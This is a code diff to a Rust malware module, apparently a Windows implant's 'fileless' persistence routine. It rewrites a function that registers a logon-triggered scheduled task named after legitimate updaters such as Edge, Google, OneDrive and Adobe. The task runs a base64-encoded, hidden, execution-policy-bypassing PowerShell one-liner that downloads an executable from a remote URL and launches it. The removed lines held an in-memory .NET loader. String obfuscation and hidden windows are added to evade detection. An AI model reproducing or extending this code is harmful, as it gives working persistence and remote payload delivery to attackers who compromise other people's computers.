@@ -391,24 +391,70 @@ pub fn persist_wmi_memory_exec(_download_url: &str) -> Result<String, String> {
 #[cfg(target_os = "windows")]
 pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, String> {
     debug_print!("[FILELESS] Setting up scheduled task download persistence...");
-    
-    let task_name = "MicrosoftEdgeUpdateService";
-    
-    // PowerShell command for download + memory execution
-    let ps_command = format!(
-        r#"powershell.exe -NoP -NonI -W Hidden -C "$wc=New-Object Net.WebClient;$d=$wc.DownloadData('{}');$a=[Reflection.Assembly]::Load($d);$a.EntryPoint.Invoke($null,$null)""#,
+
+    // Encode a PS script as base64 UTF-16LE to avoid shell-escaping issues
+    // when passed to schtasks /TR.
+    fn ps_to_b64(script: &str) -> String {
+        let bytes: Vec<u8> = script
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+        const C: &[u8] =
+            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let mut out = String::new();
+        for ch in bytes.chunks(3) {
+            let b = [
+                ch[0],
+                if ch.len() > 1 { ch[1] } else { 0 },
+                if ch.len() > 2 { ch[2] } else { 0 },
+            ];
+            let n = ((b[0] as usize) << 16) | ((b[1] as usize) << 8) | b[2] as usize;
+            out.push(C[(n >> 18) & 63] as char);
+            out.push(C[(n >> 12) & 63] as char);
+            out.push(if ch.len() > 1 { C[(n >> 6) & 63] as char } else { '=' });
+            out.push(if ch.len() > 2 { C[n & 63] as char } else { '=' });
+        }
+        out
+    }
+
+    // Polymorphic task names (machine-index picks one)
+    let task_names = [
+        "MicrosoftEdgeUpdateService",
+        "GoogleUpdateTaskMachineUA",
+        "OneDriveStandaloneUpdaterTask",
+        "AdobeAcrobatUpdateCheck",
+    ];
+    // Use a simple machine-derived index without importing full get_machine_index
+    let idx = {
+        let u = std::env::var("USERNAME").unwrap_or_default();
+        u.bytes().fold(0usize, |a, b| a.wrapping_mul(31).wrapping_add(b as usize))
+            % task_names.len()
+    };
+    let task_name = task_names[idx];
+
+    // PS one-liner: download ester.exe to a temp file using a random GUID name, then execute.
+    // Uses native-EXE-compatible Start-Process – NOT dotnet Reflection::Load.
+    let ps_script = format!(
+        "$t=[IO.Path]::GetTempPath()+[Guid]::NewGuid().ToString('N')+'.exe';\
+(New-Object Net.WebClient).DownloadFile('{}','$t');\
+if(Test-Path $t){{Start-Process $t -WindowStyle Hidden}}",
         download_url
     );
-    
+    let ps_b64 = ps_to_b64(&ps_script);
+    let ps_command = format!(
+        "powershell.exe -NoP -NonI -W Hidden -Ep Bypass -EncodedCommand {}",
+        ps_b64
+    );
+
     let schtasks_exe = obfstr!("schtasks").to_string();
-    
-    // Delete existing task if present
+
+    // Delete existing task if present (silent)
     let _ = Command::new(&schtasks_exe)
         .args(&["/Delete", "/TN", task_name, "/F"])
         .creation_flags(0x08000000)
         .output();
-    
-    // Create scheduled task
+
+    // Create scheduled task triggered on every logon
     let output = Command::new(&schtasks_exe)
         .args(&[
             "/Create",
@@ -421,13 +467,15 @@ pub fn persist_scheduled_task_download(download_url: &str) -> Result<String, Str
         .creation_flags(0x08000000)
         .output()
         .map_err(|e| format!("Failed to create task: {}", e))?;
-    
+
     if output.status.success() {
-        debug_print!("[FILELESS] Scheduled task download persistence established");
-        Ok(format!("Task persistence: downloads from {}", download_url))
+        debug_print!("[FILELESS] Scheduled task download persistence established: {}", task_name);
+        Ok(format!("Fileless task '{}' → downloads from {}", task_name, download_url))
     } else {
-        Err(format!("Task creation failed: {}", 
-            String::from_utf8_lossy(&output.stderr)))
+        Err(format!(
+            "Task creation failed: {}",
+            String::from_utf8_lossy(&output.stderr)
+        ))
     }
 }
 
